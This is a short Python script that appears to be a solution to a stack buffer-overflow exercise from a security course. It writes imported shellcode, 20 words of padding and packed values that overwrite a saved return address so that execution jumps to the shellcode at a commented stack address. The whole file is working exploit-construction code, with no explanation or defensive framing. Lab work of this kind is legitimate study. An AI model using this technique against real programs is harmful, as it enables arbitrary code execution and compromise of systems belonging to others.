#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
#fffed8d4 shellcode

#fffed93c stores return address
sys.stdout.buffer.write(shellcode)
for i in range(20):
	sys.stdout.buffer.write(pack("<I", 0x33333333))
sys.stdout.buffer.write(pack("<I", 0xfed8d433))
sys.stdout.buffer.write(pack("<I", 0x000000FF))
